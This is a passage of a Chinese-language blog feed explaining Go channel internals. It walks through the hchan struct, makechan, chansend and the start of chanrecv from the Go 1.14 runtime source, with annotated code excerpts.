punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="range"><a href="#range" class="headerlink" title="range"></a>range</h3><p>一旦 channel 关闭，channel 内部数据读完之后循环自动结束。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> x <span class="token operator">:=</span> <span class="token keyword">range</span> ch <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="channel关闭"><a href="#channel关闭" class="headerlink" title="channel关闭"></a>channel关闭</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment">// 关闭</span><span class="token function">close</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>关<ol><li>重复关闭channel，会panic。&#x3D;&#x3D;panic: close of closed channel&#x3D;&#x3D;。</li></ol></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/36e246c6153d">https://www.jianshu.com/p/36e246c6153d</a></p><p><a href="http://legendtkl.com/2017/07/30/understanding-golang-channel/">http://legendtkl.com/2017/07/30/understanding-golang-channel/</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Channel底层是怎么实现的?</title>
      <link href="/Code/Code-Golang-channel/"/>
      <url>/Code/Code-Golang-channel/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>channel 是 golang 的最重要的一个结构，是区别于其他高级语言的最重要的特色之一，也是 goroutine 通信必须要的要素之一。下文将基于golang1.14从channel的数据结构&amp;收、发操作的代码实现，进一步了解channel。</p><h3 id="hchan-struct"><a href="#hchan-struct" class="headerlink" title="hchan struct"></a>hchan struct</h3><p>hchan 中的所有属性大致可以分为三类：</p><ol><li>buffer 相关的属性。例如 buf、dataqsiz、qcount 等。 当 channel 的缓冲区大小不为 0 时，buffer 中存放了待接收的数据。使用 &#x3D;&#x3D;环形队列&#x3D;&#x3D;(ring buffer) 实现，FIFO。</li><li>waitq 相关的属性，可以理解为是一个 FIFO 的标准队列。其中 recvq 中是正在等待接收数据的 goroutine，sendq 中是等待发送数据的 goroutine。waitq 使用&#x3D;&#x3D;双向链表&#x3D;&#x3D;实现。</li><li>其他属性，例如 lock、elemtype、closed 等。</li></ol><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> hchan <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  qcount<span class="token builtin">uint</span><span class="token comment">// 队列中数据个数</span>  dataqsiz<span class="token builtin">uint</span><span class="token comment">// channel大小</span>  bufunsafe<span class="token punctuation">.</span>Pointer<span class="token comment">// 存放数据的环形数组</span>  elemsize<span class="token builtin">uint16</span><span class="token comment">// channel中数据类型的大小</span>  closed<span class="token builtin">uint32</span><span class="token comment">// 表示channel是否关闭</span>  elemtype<span class="token operator">*</span>_type<span class="token comment">// 元素数据类型</span>  sendx<span class="token builtin">uint</span><span class="token comment">// buffer 中已发送的索引位置 send index</span>  recvx<span class="token builtin">uint</span><span class="token comment">// buffer 中已接收的索引位置 receive index</span>  recvqwaitq<span class="token comment">// 等待接收的 goroutine list of recv waiters</span>  sendqwaitq<span class="token comment">// 等待发送的 goroutine list of send waiters</span>  <span class="token comment">// lock protects all fields in hchan, as well as several</span>  <span class="token comment">// fields in sudogs blocked on this channel.</span>  <span class="token comment">// Do not change another G's status while holding this lock</span>  <span class="token comment">// (in particular, do not ready a G), as this can deadlock</span>  <span class="token comment">// with stack shrinking.</span>  lockmutex<span class="token punctuation">&#125;</span><span class="token keyword">type</span> waitq <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  first <span class="token operator">*</span>sudog  last<span class="token operator">*</span>sudog<span class="token punctuation">&#125;</span><span class="token keyword">type</span> sudog <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  g<span class="token operator">*</span>g  selectdone<span class="token operator">*</span><span class="token builtin">uint32</span> <span class="token comment">// CAS to 1 to win select race (may point to stack)</span>  next<span class="token operator">*</span>sudog  prev<span class="token operator">*</span>sudog  elemunsafe<span class="token punctuation">.</span>Pointer <span class="token comment">// data element (may point to stack)</span>  acquiretime <span class="token builtin">int64</span>  releasetime <span class="token builtin">int64</span>  ticket      <span class="token builtin">uint32</span>  parent      <span class="token operator">*</span>sudog <span class="token comment">// semaRoot binary tree</span>  waitlink    <span class="token operator">*</span>sudog <span class="token comment">// g.waiting list or semaRoot</span>  waittail    <span class="token operator">*</span>sudog <span class="token comment">// semaRoot</span>  c           <span class="token operator">*</span>hchan <span class="token comment">// channel</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到 </p><ol><li>channel 其实就是一个队列加一个锁，只不过这个锁是一个轻量级锁。</li><li>recvq 是读操作阻塞在 channel 的 goroutine 列表，sendq 是写操作阻塞在 channel 的 goroutine 列表。</li><li>链表的实现是 sudog，其实就是一个对 g 的结构的封装。</li></ol><h3 id="makechan"><a href="#makechan" class="headerlink" title="makechan"></a>makechan</h3><ol><li>参数校验 2-15行</li><li>初始化hchan 17-37行<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">makechan</span><span class="token punctuation">(</span>t <span class="token operator">*</span>chantype<span class="token punctuation">,</span> size <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>hchan <span class="token punctuation">&#123;</span> elem <span class="token operator">:=</span> t<span class="token punctuation">.</span>elem <span class="token comment">// compiler checks this but be safe.</span>  <span class="token comment">// 元素类型大小限制，不能啥也放</span> <span class="token keyword">if</span> elem<span class="token punctuation">.</span>size <span class="token operator">>=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span> <span class="token punctuation">&#123;</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"makechan: invalid channel element type"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 对齐限制</span> <span class="token keyword">if</span> hchanSize<span class="token operator">%</span>maxAlign <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> elem<span class="token punctuation">.</span>align <span class="token operator">></span> maxAlign <span class="token punctuation">&#123;</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"makechan: bad alignment"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> mem<span class="token punctuation">,</span> overflow <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">MulUintptr</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> overflow <span class="token operator">||</span> mem <span class="token operator">></span> maxAlloc<span class="token operator">-</span>hchanSize <span class="token operator">||</span> size <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token function">panic</span><span class="token punctuation">(</span><span class="token function">plainError</span><span class="token punctuation">(</span><span class="token string">"makechan: size out of range"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token keyword">var</span> c <span class="token operator">*</span>hchan <span class="token keyword">switch</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> mem <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment">// 没有buffer，只分配hchan结构体</span>     <span class="token comment">// Queue or element size is zero.</span>     c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>hchan<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">mallocgc</span><span class="token punctuation">(</span>hchanSize<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">// Race detector uses this location for synchronization.</span>     c<span class="token punctuation">.</span>buf <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">raceaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">case</span> elem<span class="token punctuation">.</span>ptrdata <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>     <span class="token comment">// 元素不含指针</span>     <span class="token comment">// Allocate hchan and buf in one call. hchan和buffer一起分配，内存块连续</span>     c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>hchan<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">mallocgc</span><span class="token punctuation">(</span>hchanSize<span class="token operator">+</span>mem<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     c<span class="token punctuation">.</span>buf <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> hchanSize<span class="token punctuation">)</span> <span class="token keyword">default</span><span class="token punctuation">:</span>     <span class="token comment">// Elements contain pointers. hchan和buffer单独分配</span>     c <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>hchan<span class="token punctuation">)</span>     c<span class="token punctuation">.</span>buf <span class="token operator">=</span> <span class="token function">mallocgc</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> c<span class="token punctuation">.</span>elemsize <span class="token operator">=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token comment">// channel里元素的大小</span> c<span class="token punctuation">.</span>elemtype <span class="token operator">=</span> elem <span class="token comment">// 表示channel里放的是啥</span> c<span class="token punctuation">.</span>dataqsiz <span class="token operator">=</span> <span class="token function">uint</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token comment">// 数组大小</span> <span class="token keyword">return</span> c<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="chansend"><a href="#chansend" class="headerlink" title="chansend"></a>chansend</h3><p>chansend 函数是在编译器解析到 <code>c &lt;- x</code> 这样的代码的时候插入的，本质上就是把一个用户元素投递到 hchan 的 ringbuffer 中。chansend 调用的时候，一般用户会遇到三种情况：</p><ol><li>投递成功，非常顺利，正常返回true</li><li>投递受阻，该函数阻塞，goroutine 切走</li><li>投递失败返回false<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">chansend</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> ep unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">,</span> block <span class="token builtin">bool</span><span class="token punctuation">,</span> callerpc <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 各种前置检测</span> <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span>     <span class="token punctuation">&#125;</span>     <span class="token function">gopark</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> waitReasonChanSendNilChan<span class="token punctuation">,</span> traceEvGoStop<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"unreachable"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// channel wasn't closed during the first observation.</span> <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>closed <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>dataqsiz <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>recvq<span class="token punctuation">.</span>first <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token operator">||</span>     <span class="token punctuation">(</span>c<span class="token punctuation">.</span>dataqsiz <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>qcount <span class="token operator">==</span> c<span class="token punctuation">.</span>dataqsiz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span> <span class="token keyword">var</span> t0 <span class="token builtin">int64</span> <span class="token keyword">if</span> blockprofilerate <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     t0 <span class="token operator">=</span> <span class="token function">cputicks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开始了，开始了</span>  <span class="token comment">// 安全第一，先锁起来</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>  <span class="token comment">// 向已关闭的channel发东西，panic</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>closed <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token function">panic</span><span class="token punctuation">(</span><span class="token function">plainError</span><span class="token punctuation">(</span><span class="token string">"send on closed channel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 场景1：发的时候刚好有人等着收，不需要走buffer，所以性能最好</span> <span class="token keyword">if</span> sg <span class="token operator">:=</span> c<span class="token punctuation">.</span>recvq<span class="token punctuation">.</span><span class="token function">dequeue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sg <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     <span class="token function">send</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> sg<span class="token punctuation">,</span> ep<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 场景2：还有空间，放入buffer,索引增加</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>qcount <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>dataqsiz <span class="token punctuation">&#123;</span> <span class="token comment">// 复制，相当于 c.buf[c.sendx]</span>     qp <span class="token operator">:=</span> <span class="token function">chanbuf</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> c<span class="token punctuation">.</span>sendx<span class="token punctuation">)</span> <span class="token comment">// 数据拷贝到buffer中</span>     <span class="token function">typedmemmove</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>elemtype<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> ep<span class="token punctuation">)</span>     c<span class="token punctuation">.</span>sendx<span class="token operator">++</span> <span class="token comment">// 环形</span>     <span class="token keyword">if</span> c<span class="token punctuation">.</span>sendx <span class="token operator">==</span> c<span class="token punctuation">.</span>dataqsiz <span class="token punctuation">&#123;</span>         c<span class="token punctuation">.</span>sendx <span class="token operator">=</span> <span class="token number">0</span>     <span class="token punctuation">&#125;</span> <span class="token comment">// 存储元素个数增加</span>     c<span class="token punctuation">.</span>qcount<span class="token operator">++</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 场景3</span> <span class="token comment">// 如果是非阻塞直接返回</span> <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token punctuation">&#123;</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Block on the channel. Some receiver will complete our operation for us.</span> gp <span class="token operator">:=</span> <span class="token function">getg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> mysg <span class="token operator">:=</span> <span class="token function">acquireSudog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> mysg<span class="token punctuation">.</span>releasetime <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">if</span> t0 <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     mysg<span class="token punctuation">.</span>releasetime <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token comment">// No stack splits between assigning elem and enqueuing mysg</span> <span class="token comment">// on gp.waiting where copystack can find it.</span> mysg<span class="token punctuation">.</span>elem <span class="token operator">=</span> ep mysg<span class="token punctuation">.</span>waitlink <span class="token operator">=</span> <span class="token boolean">nil</span> mysg<span class="token punctuation">.</span>g <span class="token operator">=</span> gp mysg<span class="token punctuation">.</span>isSelect <span class="token operator">=</span> <span class="token boolean">false</span> mysg<span class="token punctuation">.</span>c <span class="token operator">=</span> c gp<span class="token punctuation">.</span>waiting <span class="token operator">=</span> mysg gp<span class="token punctuation">.</span>param <span class="token operator">=</span> <span class="token boolean">nil</span>  <span class="token comment">// goroutine相关结构入队列，等待唤醒</span> c<span class="token punctuation">.</span>sendq<span class="token punctuation">.</span><span class="token function">enqueue</span><span class="token punctuation">(</span>mysg<span class="token punctuation">)</span> atomic<span class="token punctuation">.</span><span class="token function">Store8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>gp<span class="token punctuation">.</span>parkingOnChan<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">// 将 goroutine 转入 waiting 状态，并解锁，用户侧看就是阻塞住了。</span> <span class="token function">gopark</span><span class="token punctuation">(</span>chanparkcommit<span class="token punctuation">,</span> unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">,</span> waitReasonChanSend<span class="token punctuation">,</span> traceEvGoBlockSend<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token function">KeepAlive</span><span class="token punctuation">(</span>ep<span class="token punctuation">)</span> <span class="token comment">// someone woke us up.</span> <span class="token keyword">if</span> mysg <span class="token operator">!=</span> gp<span class="token punctuation">.</span>waiting <span class="token punctuation">&#123;</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"G waiting list is corrupted"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 资源释放</span> gp<span class="token punctuation">.</span>waiting <span class="token operator">=</span> <span class="token boolean">nil</span> gp<span class="token punctuation">.</span>activeStackChans <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token keyword">if</span> gp<span class="token punctuation">.</span>param <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> c<span class="token punctuation">.</span>closed <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>         <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"chansend: spurious wakeup"</span><span class="token punctuation">)</span>     <span class="token punctuation">&#125;</span>     <span class="token function">panic</span><span class="token punctuation">(</span><span class="token function">plainError</span><span class="token punctuation">(</span><span class="token string">"send on closed channel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> gp<span class="token punctuation">.</span>param <span class="token operator">=</span> <span class="token boolean">nil</span> <span class="token keyword">if</span> mysg<span class="token punctuation">.</span>releasetime <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token function">blockevent</span><span class="token punctuation">(</span>mysg<span class="token punctuation">.</span>releasetime<span class="token operator">-</span>t0<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> mysg<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token boolean">nil</span> <span class="token function">releaseSudog</span><span class="token punctuation">(</span>mysg<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>golang内执行 &#x3D;&#x3D;&lt;- x&#x3D;&#x3D; 会调用chansend函数，会有三种场景：</p><ol><li><p>场景一：如果有人（ goroutine ）等着取 channel 的元素，这种场景最快乐，直接把元素给他就完了，然后把它唤醒，hchan 本身递增下 ringbuffer 索引；<strong>举一反三：kafka也有这种高效操作。</strong></p></li><li><p>场景二：如果 ringbuffer 还有空间，那么就把元素存着，这种也是场景的流程，存和取走的是异步流程，可以把 channel 理解成消息队列，生产者和消费者解耦；</p></li><li><p>场景三：ringbuffer 没空间，这个时候就要是否需要 block 了，一般来讲，<code>c &lt;- x</code> 编译出的代码都是 <code>block = true</code> ，那么什么时候 chansend 的 block 参数会是 false 呢？答案是：select 的时候；</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">select</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> c <span class="token operator">&lt;-</span> v<span class="token punctuation">:</span>  <span class="token comment">// ... foo</span>  <span class="token keyword">default</span><span class="token punctuation">:</span>  <span class="token comment">// ... bar</span><span class="token punctuation">&#125;</span><span class="token comment">// 编译后</span><span class="token keyword">if</span> <span class="token function">selectnbsend</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//  ... foo</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//  ... bar</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">selectnbsend</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> elem unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">)</span> <span class="token punctuation">(</span>selected <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 调用 chansend 函数，block 参数为 false；</span>  <span class="token keyword">return</span> <span class="token function">chansend</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token function">getcallerpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="chanrecv"><a href="#chanrecv" class="headerlink" title="chanrecv"></a>chanrecv</h3><p>chanrecv 函数是在编译器解析到 <code> &lt;- c</code> 这样的代码的时候插入的，本质上就是从sender或 hchan 的 ringbuffer 中取一个元素。chanrecv 调用的时候，一般用户会遇到三种情况：</p><ol><li>接收成功，非常顺利，正常返回元素，true</li><li>接收受阻，该函数阻塞，goroutine 切走</li><li>接收失败返回nil，false<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// &lt;- c 对应</span><span class="token keyword">func</span> <span class="token function">chanrecv1</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> elem unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">chanrecv</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// v, ok := &lt;- c 对应</span><span class="token keyword">func</span> <span class="token function">chanrecv2</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> elem unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">)</span> <span class="token punctuation">(</span>received <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token boolean">_</span><span class="token punctuation">,</span> received <span class="token operator">=</span> <span class="token function">chanrecv</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">// 除了select的时候，block都是true</span><span class="token keyword">func</span> <span class="token function">chanrecv</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> ep unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">,</span> block <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>selected<span class="token punctuation">,</span> received <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 先各种判断</span> <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span>     <span class="token punctuation">&#125;</span>     <span class="token function">gopark</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> waitReasonChanReceiveNilChan<span class="token punctuation">,</span> traceEvGoStop<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"unreachable"</span><span class="token punctuation">)</span> <span class="token comment">// incorrect behavior when racing with a close.</span> <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>dataqsiz <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>sendq<span class="token punctuation">.</span>first <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">||</span>     c<span class="token punctuation">.</span>dataqsiz <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> atomic<span class="token punctuation">.</span><span class="token function">Loaduint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>qcount<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     atomic<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>closed<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token punctuation">&#125;</span> <span class="token keyword">var</span> t0 <span class="token builtin">int64</span> <span class="token keyword">if</span> blockprofilerate <span class="token operator">></span> <span class="token number">0</span> 